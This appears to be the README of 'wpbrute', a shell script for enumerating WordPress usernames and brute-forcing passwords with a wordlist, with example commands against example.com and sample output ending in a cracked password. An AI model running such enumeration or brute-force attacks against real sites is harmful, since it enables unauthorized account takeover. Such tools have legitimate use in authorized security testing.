wpbrute
=======

Wordpress user enumeration and password bruteforce.

<b>User Enumeration:</b>
<code><br /><br />
$ ./wpbrute.sh --url=www.example.com<br />
[+] Username or nickname enumeration<br />
admin<br />
testuser</code>

<b>Password Bruteforce:</b>
<code><br /><br />
$ ./wpbrute.sh --url=www.example.com --user=admin --wordlist=wordlist.txt<br />
[+] Bruteforcing user [admin]<br />
123456<br />
test123<br />
123test123<br />
The password is: 123test123</code>
